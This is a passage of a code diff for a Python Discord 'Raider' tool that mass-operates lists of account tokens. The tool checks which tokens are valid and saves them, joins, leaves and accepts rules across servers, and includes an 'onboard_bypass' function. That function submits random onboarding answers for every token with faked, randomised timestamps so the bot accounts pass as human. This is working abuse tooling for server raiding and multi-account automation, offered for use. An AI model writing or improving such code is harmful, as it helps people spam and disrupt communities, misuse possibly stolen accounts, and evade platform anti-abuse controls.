                             console.log("Stopped", C["magenta"], token[:25], f"Ratelimit Exceeded - {int(round(retry_after))}s",)
                             break
@@ -1075,7 +1263,7 @@ class Raider:
                             console.log("Found", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                             break
                         case 429:
-                            retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
+                            retry_after = response.json()["retry_after"]
                             console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                             time.sleep(float(retry_after))
                         case _:
@@ -1090,6 +1278,7 @@ class Raider:
         Menu().run(main_checker, args)
 
     def token_checker(self):
+        # todo: fix saving valid tokens
         valid = []
 
         def main(token):
@@ -1109,14 +1298,12 @@ class Raider:
                             console.log("Locked", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                             break
                         case 429:
-                            retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
+                            retry_after = response.json()["retry_after"]
                             console.log("Ratelimit", C["pink"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"{retry_after}s")
                             time.sleep(retry_after)
                         case _:
                             console.log("Invalid", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                             break
-                with open("data/tokens.txt", "w") as f:
-                    f.write("\n".join(valid))
             except Exception as e:
                 console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
@@ -1127,6 +1314,9 @@ class Raider:
             (token, ) for token in tokens
         ]
         Menu().run(main, args)
+
+        with open("data/tokens.txt", "w") as f:
+            f.write("\n".join(valid))
 
     def accept_rules(self, guild_id):
         try:
@@ -1174,64 +1364,65 @@ class Raider:
 
     def onboard_bypass(self, guild_id):
         try:
-            onboarding_responses_seen = {}
-            onboarding_prompts_seen = {}
-            onboarding_responses = []
-            in_guild = []
-
-            for _token in tokens:
-                response = session.get(
-                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding",
-                    headers=self.headers(_token)
-                )
-
-                match response.status_code:
+            master_token = None
+            for token in tokens:
+                resp = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/onboarding", headers=self.headers(token))
+                match resp.status_code:
                     case 200:
-                        in_guild.append(_token)
+                        onboarding_data = resp.json()
+                        master_token = token
                         break
 
-            if not in_guild:
-                console.log("Failed", C["red"], "Missing Access")
-                input()
-                Menu().main_menu()
-            else:
-                data = response.json()
-                now = int(datetime.now().timestamp())
+            if not master_token:
+                console.log("Failed", C["red"], "No tokens have access to this guild's onboarding.")
+                return
 
-                for __ in data["prompts"]:
-                    onboarding_responses.append(__["options"][-1]["id"])
+            responses = []
+            prompts_seen = {}
+            options_seen = {}
+            
+            prompts = onboarding_data.get("prompts", [])
+            if not prompts:
+                console.log("Info", C["gray"], "Guild has no onboarding prompts.")
+                return
 
-                    onboarding_prompts_seen[__["id"]] = now
-
-                    for prompt in __["options"]:
-                        if prompt:
-                            onboarding_responses_seen[prompt["id"]] = now
-                        else:
-                            console.log("Failed", C["red"], "No onboarding in This Server",)
-                            input()
-                            Menu().main_menu()
+            for prompt in prompts:
+                p_id = prompt["id"]
+                available_options = prompt.get("options", [])
+                if not available_options: continue
+                
+                selected_option = random.choice(available_options)["id"]
+                responses.append(selected_option)
+                
+                fake_time = int(time.time()) - random.randint(5, 15)
+                prompts_seen[p_id] = fake_time
+                
+                for opt in available_options:
+                    options_seen[opt["id"]] = fake_time
 
             def run_task(token):
-                try:
-                    json_data = {
-                        "onboarding_responses": onboarding_responses,
-                        "onboarding_prompts_seen": onboarding_prompts_seen,
-                        "onboarding_responses_seen": onboarding_responses_seen,
-                    }
+                token_time = int(time.time()) - random.randint(1, 10)
+                
+                t_prompts_seen = {k: token_time for k in prompts_seen}
+                t_options_seen = {k: token_time for k in options_seen}
 
-                    response = session.post(
-                        f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
-                        headers=self.headers(token),
-                        json=json_data
-                    )
+                payload = {
+                    "onboarding_responses": responses,
+                    "onboarding_prompts_seen": t_prompts_seen,
+                    "onboarding_responses_seen": t_options_seen,
+                }
 
-                    match response.status_code:
-                        case 200:
-                            console.log("Accepted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
-                        case _:
-                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
-                except Exception as e:
-                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
+                resp = session.post(
+                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
+                    headers=self.headers(token),
+                    json=payload
+                )
+
+                match resp.status_code:
+                    case 200:
+                        console.log("Accepted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+                    case _:
+                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message"))
 
             args = [
                 (token, ) for token in tokens
@@ -1388,7 +1579,7 @@ class Raider:
                         "guild_id": guild_id,
                         "message_flags": 0,
                         "message_id": message_id,
-                        "nonce": self.nonce(),
+                        "nonce": str(self.nonce()),
                         "session_id": uuid.uuid4().hex,
                         "type": 3,
                     }
@@ -1418,12 +1609,18 @@ class Raider:
 
 class Menu:
     def __init__(self):
+        global global_raider
         if not color:
             self.background = C["light_blue"]
         else:
             self.background = C[color]
-            
-        self.raider = Raider()
+
+        if global_raider is None:
+            self.raider = Raider()
+            global_raider = self.raider
+        else:
+            self.raider = global_raider
+
         self.options = {
             "1": self.joiner, 
             "2": self.leaver,
@@ -1777,8 +1974,11 @@ class Menu:
 
     @wrapper
     def exits(self):
-        os._exit(0)
+        choice = input(console.prompt("Are you sure you want to quit", ask=True))
+        if choice.lower().startswith("y"):
+            os._exit(0)
+        else:
+            self.main_menu()
 
 if __name__ == "__main__":
     Menu().main_menu()
-
